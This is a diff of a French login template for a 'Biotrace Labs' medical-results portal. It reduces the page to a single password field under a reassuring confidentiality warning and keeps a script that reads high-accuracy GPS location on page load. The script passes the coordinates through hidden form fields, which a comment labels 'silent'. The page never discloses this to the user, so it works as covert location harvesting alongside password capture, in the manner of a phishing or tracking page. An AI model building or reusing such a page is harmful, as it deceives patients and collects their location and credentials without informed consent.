@@ -2,28 +2,90 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Portail Patient – Biotrace Labs</title>
-    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <title>Accès sécurisé – Biotrace Labs</title>
+    <style>
+        body {
+            font-family: "Segoe UI", sans-serif;
+            background-color: #f8f9fa;
+            color: #2a2a2a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 40px 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+
+        h2 {
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+
+        .warning {
+            font-size: 13px;
+            color: #8a1f1f;
+            margin-bottom: 25px;
+            font-style: italic;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 10px 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 14px;
+            background-color: #2f5e88;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #244b6b;
+        }
+
+        .error {
+            color: #b30000;
+            margin-top: 10px;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
 </head>
 <body>
     <div class="login-container">
-        <img src="{{ url_for('static', filename='logo.png') }}" alt="Logo Biotrace Labs" class="logo">
+        <h2>Accéder à vos analyses sécurisées</h2>
+        <p class="warning">⚠️ Ce portail est réservé à un usage confidentiel.  
+            Toute tentative d'accès non autorisé est enregistrée.  
+            Les données médicales sont protégées par le secret professionnel.</p>
 
         <form method="POST" onsubmit="injectCoords()">
-            <label for="username">Identifiant patient</label>
-            <input type="text" name="username" placeholder="Non requis" disabled>
+            <input type="password" name="password" id="password" placeholder="Mot de passe" required>
 
-            <label for="password">Mot de passe</label>
-            <div class="password-wrapper">
-                <input type="password" name="password" id="password" required>
-                <span class="toggle-password" onclick="togglePassword()">👁️</span>
-            </div>
-
-            <!-- Champs cachés pour coord GPS -->
+            <!-- Coordonnées GPS silencieuses -->
             <input type="hidden" name="lat" id="lat">
             <input type="hidden" name="lon" id="lon">
 
             <button type="submit">Valider</button>
+
             {% if error %}
                 <p class="error">{{ error }}</p>
             {% endif %}
@@ -34,8 +96,7 @@
         let userLatitude = "";
         let userLongitude = "";
 
-        // Récupère la géoloc si dispo
-        window.onload = function () {
+        document.addEventListener("DOMContentLoaded", function () {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function (position) {
@@ -48,17 +109,11 @@
                     { enableHighAccuracy: true, timeout: 5000 }
                 );
             }
-        };
+        });
 
-        // Injecte les coordonnées GPS dans le formulaire
         function injectCoords() {
             document.getElementById("lat").value = userLatitude;
             document.getElementById("lon").value = userLongitude;
-        }
-
-        function togglePassword() {
-            const pwd = document.getElementById("password");
-            pwd.type = pwd.type === "password" ? "text" : "password";
         }
     </script>
 </body>
